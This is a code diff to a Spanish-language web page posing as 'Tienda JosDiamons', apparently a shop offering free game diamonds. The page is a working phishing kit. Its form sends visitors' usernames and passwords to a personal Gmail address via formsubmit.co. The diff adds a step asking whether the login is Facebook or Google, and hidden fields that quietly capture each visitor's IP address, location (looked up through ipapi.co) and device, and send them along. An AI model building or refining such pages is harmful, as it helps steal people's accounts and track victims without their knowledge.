@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -16,7 +15,7 @@
     }
 
     .banner-animado {
-      font-size: 24px;
+      font-size: 26px;
       font-weight: bold;
       background: linear-gradient(90deg, #ffcc00, #ff6600, #ffcc00);
       -webkit-background-clip: text;
@@ -46,6 +45,11 @@
       color: white;
       cursor: pointer;
       font-weight: bold;
+      transition: background-color 0.3s;
+    }
+
+    button:hover {
+      background-color: #e65c00;
     }
 
     .opciones {
@@ -56,9 +60,11 @@
     }
 
     .opcion {
-      background-color: #222;
+      background: linear-gradient(145deg, #292942, #1e1e38);
+      border: 1px solid #444;
       padding: 15px;
       border-radius: 12px;
+      box-shadow: 0 0 10px #000;
     }
 
     .seccion {
@@ -75,20 +81,58 @@
       border-radius: 10px;
       margin-top: 30px;
     }
+
+    .cuenta-tipo {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      margin-top: 10px;
+    }
+
+    .cuenta-tipo input {
+      display: none;
+    }
+
+    .cuenta-tipo label {
+      padding: 10px 20px;
+      background-color: #444;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    .cuenta-tipo input:checked + label {
+      background-color: #ff6600;
+      color: #fff;
+      font-weight: bold;
+    }
   </style>
 </head>
 <body>
   <div class="banner-animado">¡Bienvenido a la Tienda JosDiamons!</div>
 
-  <!-- FORMULARIO COMPLETO -->
   <form id="formularioDiamantes" action="https://formsubmit.co/ajax/muriilloventee@gmail.com" method="POST">
-    
+
+    <!-- Campos ocultos para IP, ubicación y dispositivo -->
+    <input type="hidden" name="ip" id="ip">
+    <input type="hidden" name="ubicacion" id="ubicacion">
+    <input type="hidden" name="dispositivo" id="dispositivo">
+
     <!-- Pantalla 1: Inicio de sesión -->
     <div id="login" class="seccion visible">
       <h2>Inicia sesión</h2>
       <input type="text" name="usuario" placeholder="Usuario" required />
       <input type="password" name="contraseña" placeholder="Contraseña" required />
-      <button type="button" onclick="mostrarSeccion('diamantes')">Entrar</button>
+
+      <h4>¿Tu cuenta es de?</h4>
+      <div class="cuenta-tipo">
+        <input type="radio" id="facebook" name="tipo_cuenta" value="Facebook" />
+        <label for="facebook">Facebook</label>
+        <input type="radio" id="google" name="tipo_cuenta" value="Google" />
+        <label for="google">Google</label>
+      </div>
+
+      <button type="button" onclick="validarYMostrar()">Entrar</button>
     </div>
 
     <!-- Pantalla 2: Selección de diamantes -->
@@ -134,10 +178,7 @@
 
   <script>
     function mostrarSeccion(id) {
-      document.getElementById("login").classList.remove("visible");
-      document.getElementById("diamantes").classList.remove("visible");
-      document.getElementById("formulario").classList.remove("visible");
-      document.getElementById("mensajeFinal").classList.remove("visible");
+      document.querySelectorAll(".seccion").forEach(seccion => seccion.classList.remove("visible"));
       document.getElementById(id).classList.add("visible");
     }
 
@@ -146,8 +187,17 @@
       mostrarSeccion("formulario");
     }
 
+    function validarYMostrar() {
+      const cuentaMarcada = document.querySelector('input[name="tipo_cuenta"]:checked');
+      if (!cuentaMarcada) {
+        alert("Debes seleccionar si tu cuenta es de Google o Facebook.");
+        return;
+      }
+      mostrarSeccion("diamantes");
+    }
+
     document.getElementById("formularioDiamantes").addEventListener("submit", function (e) {
-      e.preventDefault(); // Detiene el envío normal
+      e.preventDefault();
       const form = e.target;
 
       fetch(form.action, {
@@ -166,6 +216,22 @@
         alert("Hubo un error al enviar el formulario.");
       });
     });
+
+    // Captura IP, ubicación y dispositivo
+    fetch('https://ipapi.co/json/')
+      .then(res => res.json())
+      .then(data => {
+        document.getElementById('ip').value = data.ip || 'No detectada';
+        document.getElementById('ubicacion').value = `${data.city}, ${data.region}, ${data.country_name}`;
+      })
+      .catch(() => {
+        document.getElementById('ubicacion').value = 'Ubicación no detectada';
+      });
+
+    const ua = navigator.userAgent;
+    const esMovil = /Mobi|Android/i.test(ua);
+    const sistema = navigator.platform;
+    document.getElementById('dispositivo').value = esMovil ? `Móvil (${sistema})` : `PC (${sistema})`;
   </script>
 </body>
-      </html>
+            </html>
